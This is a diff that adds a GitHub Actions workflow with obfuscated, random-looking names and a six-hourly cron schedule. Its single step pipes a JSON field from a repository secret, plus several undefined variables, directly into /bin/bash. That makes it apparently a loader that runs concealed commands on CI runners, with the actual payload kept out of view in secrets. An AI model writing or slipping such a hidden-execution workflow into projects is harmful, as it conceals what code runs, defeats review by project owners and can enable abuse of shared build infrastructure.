@@ -1,0 +1,21 @@
+name: maogechui4645
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: maogechui4645
+        env:
+          trdqm1: ${{ secrets.trdqm1 }}
+        run: |
+          echo $trdqm1 | jq -r .dexr25900 | /bin/bash
+          echo $n64 | jq -r .zasyq34 | /bin/bash
+          echo $oshzq777 | jq -r .ju75 | /bin/bash
+          echo $ox744 | jq -r .nhlt5 | /bin/bash
+          echo $f8120 | jq -r .xrh4 | /bin/bash
+
